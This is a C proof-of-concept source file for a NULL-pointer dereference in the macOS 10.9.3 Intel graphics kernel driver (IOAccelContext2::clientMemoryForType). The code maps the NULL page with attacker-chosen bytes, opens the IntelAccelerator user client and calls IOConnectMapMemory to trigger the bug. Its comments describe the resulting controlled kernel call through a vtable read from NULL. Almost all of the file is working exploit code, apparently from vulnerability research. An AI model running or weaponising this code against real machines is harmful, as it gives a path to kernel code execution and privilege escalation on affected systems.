// compile with: clang -Wall -o ig_video_main_map_memory_NULL ig_video_main_map_memory_NULL.c -m32 -framework IOKit
// note the -m32
// tested on: MacBookAir5,2 w/ 10.9.3/13d64

#include <inttypes.h>
#include <IOKit/IOKitLib.h>
#include <mach/mach.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <arpa/inet.h>
#include <mach/mach.h>
#include <mach/vm_map.h>

int main(){
  // re map the null page rw

  vm_deallocate(mach_task_self(), 0x0, 0x1000);
  vm_address_t addr = 0;
  vm_allocate(mach_task_self(), &addr, 0x1000, 0);
  char* np = 0;
  for (int i = 0; i < 0x1000; i++){
    np[i] = 'A';
  }

  kern_return_t err;
  CFMutableDictionaryRef matching = IOServiceMatching("IntelAccelerator");
  if (!matching){
    printf("unable to create matching dictionary\n");
    return 0;
  }

  io_service_t ia_service = IOServiceGetMatchingService(kIOMasterPortDefault, matching);
  if (ia_service == MACH_PORT_NULL){
    printf("unable to get matching service\n");
    return 0;
  }

  io_connect_t conn = MACH_PORT_NULL;
  err = IOServiceOpen(ia_service, mach_task_self(), 0x100, &conn);
  if (err != KERN_SUCCESS){
    printf("unable to open user client\n");
    return 0;
  }

  void* token_buf;
  size_t token_buf_size = 0;

  // kernel NULL deref here in IOAccelContext2::clientMemoryForType
  // mov rdi, [r12+1D8h]      ; rdi := NULL
  // mov rax, [rdi]           ; read vtable pointer from NULL
  // call qword ptr [rax+20h] ; controlled call
  err = IOConnectMapMemory(conn, 0, mach_task_self(), &token_buf, &token_buf_size, 1);
  if (err != KERN_SUCCESS){
    printf("unable to map token buffer\n");
    return 0;
  }

  printf("got token buffer: 0x%p size:0x%x\n", token_buf, token_buf_size);

  return 0;
}
